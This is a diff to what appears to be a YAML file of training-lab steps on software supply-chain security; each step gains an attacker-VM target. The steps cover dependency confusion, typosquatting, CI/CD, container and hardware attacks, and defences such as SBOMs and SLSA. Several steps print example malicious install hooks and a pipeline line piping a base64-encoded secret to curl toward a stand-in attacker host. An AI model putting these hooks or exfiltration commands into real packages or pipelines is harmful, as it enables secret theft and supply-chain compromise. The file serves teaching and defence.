@@ -24,6 +24,7 @@ steps:
     type: output_contains
     expect: Dependency Analysis
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Dependency Analysis ==='' && pip list 2>/dev/null | head -20 && echo ''---'' && echo ''Checking for outdated packages:'' && pip list --outdated 2>/dev/null | head -10 && echo ''---''
     && echo ''pip-audit (if available):'' && pip-audit 2>/dev/null | head -10 || echo ''pip-audit not installed'' && echo '''' && echo ''Supply chain risk: outdated packages may have known CVEs'''
   risk_level: low
@@ -42,6 +43,7 @@ steps:
     type: output_contains
     expect: Dependency Confusion
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Dependency Confusion Attack ===\n\n[Concept]\n1. Target org uses internal package: "mycompany-utils" v1.0\n2. Attacker publishes "mycompany-utils" v99.0 on PyPI/npm\n3. Build system
     resolves public v99.0 > internal v1.0\n4. Malicious code executes during install\n\n[Attack Steps]\n1. Enumerate internal package names (job postings, GitHub, error messages)\n2. Register same name
     on public registry with higher version\n3. Add post-install script with reverse shell\n4. Wait for target CI/CD to pull the package\n\n[Example setup.py]\nfrom setuptools import setup\nimport os\nos.system("curl
@@ -64,6 +66,7 @@ steps:
     type: output_contains
     expect: Typosquatting
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Typosquatting Attack ===\n\n[Common Typo Patterns]\nOriginal       | Typosquatted\nrequests       | reqeusts, request, requets\nurllib3        | urllib4, urlib3, urllib33\nnumpy          |
     numby, numppy, num-py\npandas         | panda, pandsa, pandass\n\n[Generation techniques]\n1. Character swap: requests -> reqeusts\n2. Missing char: requests -> reqests\n3. Extra char: requests -> requestss\n4.
     Similar char: requests -> reguests\n5. Version suffix: requests2, requests3\n\n[Detection]\npip install safety\nsafety check  # Check installed packages\n\n[Real incidents]\n- colourama (typo of colorama):
@@ -85,6 +88,7 @@ steps:
     type: output_contains
     expect: CI/CD Pipeline
     field: stdout
+  target_vm: attacker
   script: echo -e '=== CI/CD Pipeline Attacks ===\n\n[GitHub Actions Vulnerabilities]\n\n1. pull_request_target with checkout\n- Runs with repo write access + secrets\n- Attacker PR code executes with elevated
     privileges\n\n2. Poisoned Pipeline Execution (PPE)\n- Modify CI config in PR (.github/workflows/)\n- Inject malicious steps\n\n3. Secret Extraction\n- echo \${{ secrets.TOKEN }} | base64 | curl attacker\n-
     Secrets visible in forked repo actions\n\n4. Artifact Poisoning\n- Replace build artifacts with trojaned versions\n- actions/upload-artifact -> download-artifact chain\n\n5. Self-hosted Runner Exploitation\n-
@@ -106,6 +110,7 @@ steps:
     type: output_contains
     expect: Malicious setup.py
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/malicious_setup.py << 'PYEOF'\n# WARNING: Educational purpose only\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\n\nclass PostInstallCommand(install):\n\
     \    def run(self):\n        # Malicious code executes during pip install\n        subprocess.call(['curl', '-s', 'http://attacker/callback'])\n        install.run(self)\n\nsetup(\n    name='legitimate-looking-package',\n\
     \    version='1.0.0',\n    description='Totally safe package',\n    cmdclass={'install': PostInstallCommand},\n)\nPYEOF\necho '=== Malicious setup.py ===' && cat /tmp/malicious_setup.py && echo '' &&\
@@ -127,6 +132,7 @@ steps:
     type: output_contains
     expect: SolarWinds
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== SolarWinds SUNBURST Analysis ===\n\n[Attack Chain]\n1. Initial Access: SolarWinds build server compromise\n2. Code Injection: Malicious code inserted into Orion DLL\n3. Build Compromise:
     Signed with legitimate SolarWinds cert\n4. Distribution: Pushed via official update channel\n5. Dormancy: 12-14 day sleep before activation\n6. C2: DNS-based beaconing (avsvmcloud.com)\n7. Lateral Movement:
     SAML token forging (GoldenSAML)\n8. Data Exfil: Targeted, selective data collection\n\n[Key Techniques]\n- Build process injection (not source repo)\n- DGA (Domain Generation Algorithm) for C2\n- Anti-analysis:
@@ -147,6 +153,7 @@ steps:
     type: output_contains
     expect: Code Signing
     field: stdout
+  target_vm: attacker
   script: echo '=== Code Signing & Verification ===' && echo '[SHA256 Hash Verification]' && echo 'test content' > /tmp/signed_file.txt && sha256sum /tmp/signed_file.txt && echo '' && echo '[GPG Signing
     (concept)]' && echo 'gpg --sign --armor file -> file.asc' && echo 'gpg --verify file.asc file -> Good signature from...' && echo '' && echo '[Sigstore/cosign]' && echo 'cosign sign --key cosign.key
     image:tag' && echo 'cosign verify --key cosign.pub image:tag' && echo '' && echo '[SLSA Provenance]' && echo 'slsa-verifier verify-artifact binary --source-uri github.com/org/repo' && echo '' && echo
@@ -166,6 +173,7 @@ steps:
     type: output_contains
     expect: Container Supply Chain
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Container Supply Chain Attacks ===\n\n[1] Malicious Base Images\n- Trojaned popular images on Docker Hub\n- Cryptominers in official-looking images\n- Example: docker pull mysql
     (typo: mysqll)\n\n[2] Layer Injection\n- Modify intermediate layers\n- Add backdoor in multi-stage build\n\n[3] Registry Attacks\n- Man-in-the-middle on registry pull\n- Compromised registry credentials\n-
     Tag mutation (same tag, different content)\n\n[4] Dockerfile Risks\n- curl | bash in RUN instructions\n- Hardcoded secrets in ENV/ARG\n- Running as root without USER directive\n\n[Defense]\n- Use verified/official
@@ -185,6 +193,7 @@ steps:
     type: output_contains
     expect: SBOM
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== SBOM Generation ==='' && pip freeze 2>/dev/null | head -15 && echo ''---'' && echo ''Dependency tree:'' && pipdeptree 2>/dev/null | head -20 || pip freeze 2>/dev/null | head -10 &&
     echo '''' && echo ''[SBOM Formats]'' && echo ''- SPDX: ISO standard, broad adoption'' && echo ''- CycloneDX: OWASP standard, security-focused'' && echo '''' && echo ''[Tools]'' && echo ''- syft: Container/filesystem
     SBOM generation'' && echo ''- cyclonedx-bom: CycloneDX format from pip/npm'' && echo ''- grype: Vulnerability scan using SBOM'' && echo '''' && echo ''[Analysis]'' && echo ''syft . -o cyclonedx-json
@@ -205,6 +214,7 @@ steps:
     type: output_contains
     expect: Package Install Hook
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Package Install Hook Analysis ===\n\n[npm]\nnpm pack <package> -> extract -> check package.json\n"scripts": {\n  "preinstall": "node malicious.js",  <- DANGEROUS\n  "postinstall":
     "curl attacker.com",  <- DANGEROUS\n  "install": "node-gyp rebuild"       <- Normal (native module)\n}\n\n[Python/pip]\nsetup.py: cmdclass override\nsetup.cfg: [options.entry_points] console_scripts\npyproject.toml:
     [tool.setuptools.cmdclass]\n\n[Ruby/gem]\ngemspec: extensions (extconf.rb executed during install)\n\n[Detection]\n- npm: npm install --ignore-scripts (safe install)\n- pip: --no-build-isolation --no-deps\n-
@@ -225,6 +235,7 @@ steps:
     type: output_contains
     expect: Git Repository Attacks
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Git Repository Attacks ===\n\n[1] Commit Author Spoofing\ngit commit --author="Linus Torvalds <torvalds@linux.org>"\n- No authentication for commit author\n- Defense: GPG-signed
     commits (git commit -S)\n\n[2] History Rewriting\ngit push --force: Overwrite protected history\n- Defense: Branch protection rules\n\n[3] Secret Scanning\ngit log -p | grep -iE "(password|api.key|secret|token)"\ntrufflehog
     git file://./\n- Secrets persist even after deletion (in git history)\n\n[4] Malicious Git Hooks\n.git/hooks/pre-commit: Execute on commit\n- Defense: Don\''t clone from untrusted sources\n\n[5] Submodule
@@ -246,6 +257,7 @@ steps:
     type: output_contains
     expect: Hardware Supply Chain
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Hardware Supply Chain Attacks ===\n\n[1] Firmware Attacks\n- UEFI rootkit: Persists across OS reinstall\n- BMC/IPMI backdoor: Out-of-band management access\n- SSD firmware: Hide
     data in reserved areas\n\n[2] Hardware Implants\n- Modified network cards: Packet interception\n- USB implants: Keystroke injection (BadUSB)\n- Chip-level backdoors: Custom IC modifications\n\n[3] Real
     Incidents\n- Supermicro (alleged): Bloomberg chip implant report\n- Equation Group: HDD firmware implants (NSA)\n- ShadowHammer: ASUS Live Update compromise\n\n[4] UEFI/Secure Boot\n- CosmicStrand:
@@ -266,6 +278,7 @@ steps:
     type: output_contains
     expect: Supply Chain Monitoring
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Supply Chain Monitoring Strategy ===\n\n[Package Integrity]\n1. Lock files: package-lock.json, Pipfile.lock\n2. Hash verification: pip install --require-hashes\n3. Dependency pinning:
     exact versions only\n4. Private registry with approved packages\n\n[Build Integrity]\n5. Reproducible builds: Same source -> same binary\n6. SLSA Level 3+: Hermetic, unforgeable provenance\n7. Build
     log audit: Review all build steps\n\n[Runtime Detection]\n8. Unexpected network connections during build\n9. New processes spawned by package managers\n10. File system changes outside expected paths\n\n[Automated
@@ -285,6 +298,7 @@ steps:
     type: output_contains
     expect: SLSA
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== SLSA Maturity Assessment ===\n\n[SLSA Levels]\nLevel 1: Documentation\n- Build process documented\n- Provenance generated (who, what, when)\n\nLevel 2: Hosted Build\n- Build on
     hosted service (GitHub Actions, etc.)\n- Provenance signed by build service\n\nLevel 3: Hardened Build\n- Hermetic build (no network during build)\n- Non-falsifiable provenance\n- Isolated build environment\n\nLevel
     4: Full Integrity\n- Two-person review for all changes\n- Reproducible builds\n- Full dependency verification\n\n[Current Project Assessment]\n- Version control: Yes (Git) -> meets L1\n- CI/CD: GitHub
@@ -358,6 +372,7 @@ steps:
     type: output_contains
     expect: Supply Chain Security Roadmap
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/supply_chain_roadmap.txt << ''EOF''
 
     === Supply Chain Security Roadmap ===
